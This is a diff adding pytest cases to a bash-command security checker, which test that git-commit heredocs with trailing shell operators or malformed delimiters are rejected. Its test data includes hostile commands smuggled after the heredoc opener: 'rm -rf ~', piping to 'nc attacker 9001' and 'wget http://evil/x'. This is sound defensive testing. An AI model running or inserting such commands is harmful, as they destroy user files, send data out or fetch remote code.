@@ -1769,3 +1769,89 @@ class TestGenuineGitHeredocCommit:
         assert _benign_git_heredoc_sanitized(
             "git commit -m \"$(cat <<'EOF'\nx\nEOF\n)\""
         ) is None
+
+    # --- [SR-2468 S3] opener-line-trailing operator attacks (the S1 vector) --
+    # An operator + command placed on the heredoc opener line AFTER the
+    # ``<<'DELIM'`` still executes in bash. The sanitizer must NOT strip the
+    # heredoc and wave it through; the original newline-bearing command stays
+    # subject to the normal checks (check 7 blocks it).
+
+    @pytest.mark.parametrize(
+        "trailer",
+        [
+            " ; rm -rf ~",
+            " && rm -rf ~",
+            " | nc attacker 9001",
+            " & wget http://evil/x",
+        ],
+    )
+    def test_operator_after_opener_line_still_blocks(self, trailer: str) -> None:
+        cmd = "git commit -F - <<'EOF'" + trailer + "\nbody line\nEOF"
+        assert not check_bash_command(cmd).safe
+
+    @pytest.mark.parametrize(
+        "trailer",
+        [
+            " ; echo PWNED",
+            " && rm -rf ~",
+            " | nc attacker 9001",
+            " & wget http://evil/x",
+        ],
+    )
+    def test_helper_declines_opener_line_remainder(self, trailer: str) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        cmd = "git commit -F - <<'EOF'" + trailer + "\nbody\nEOF"
+        assert _benign_git_heredoc_sanitized(cmd) is None
+
+    def test_benign_shape_still_passes_after_s1_fix(self) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        # The canonical shape (nothing after the opener) still earns relief.
+        cmd = (
+            "git commit -F - <<'EOF'\n"
+            "Guard when count < limit; escape \\; sequences.\n"
+            "# Notes\nEOF"
+        )
+        assert check_bash_command(cmd).safe
+        assert _benign_git_heredoc_sanitized(cmd) == "git commit -F -"
+
+    # --- [SR-2468 S2] bash-faithful close-delimiter detection ----------------
+
+    def test_indented_close_delim_plain_form_not_terminator(self) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        # A plain <<'EOF' requires the terminator at column 0. A space-indented
+        # "EOF" is NOT the terminator -> framing unresolved -> helper declines
+        # -> the multi-line command falls through to the normal blocking checks.
+        cmd = "git commit -F - <<'EOF'\nbody\n  EOF"
+        assert _benign_git_heredoc_sanitized(cmd) is None
+        assert not check_bash_command(cmd).safe
+
+    def test_tab_indented_close_delim_accepted_for_dash_form(self) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        # The <<- form strips leading TABS, so a tab-indented terminator IS the
+        # closing delimiter and the benign shape is recognized.
+        cmd = "git commit -F - <<-'EOF'\n\tbody\n\tEOF"
+        assert _benign_git_heredoc_sanitized(cmd) == "git commit -F -"
+        assert check_bash_command(cmd).safe
+
+    def test_space_indented_close_delim_rejected_for_dash_form(self) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        # <<- strips TABS only, never spaces: a space-indented terminator is not
+        # recognized as the close delimiter -> helper declines.
+        cmd = "git commit -F - <<-'EOF'\nbody\n  EOF"
+        assert _benign_git_heredoc_sanitized(cmd) is None
+
+    def test_no_newline_after_opener_declines(self) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        # No heredoc body newline at all -> broken framing -> fail closed.
+        assert _benign_git_heredoc_sanitized("git commit -F - <<'EOF'") is None
+
+    # --- [SR-2468 S5] partial/adjacent delimiter quoting must bail -----------
+
+    @pytest.mark.parametrize(
+        "opener",
+        ["<<'E'OF", '<<"E"OF', "<<E\\OF"],
+    )
+    def test_partial_quoted_delimiter_declines(self, opener: str) -> None:
+        from equipa.bash_security import _benign_git_heredoc_sanitized
+        cmd = "git commit -F - " + opener + "\nbody\nEOF"
+        assert _benign_git_heredoc_sanitized(cmd) is None
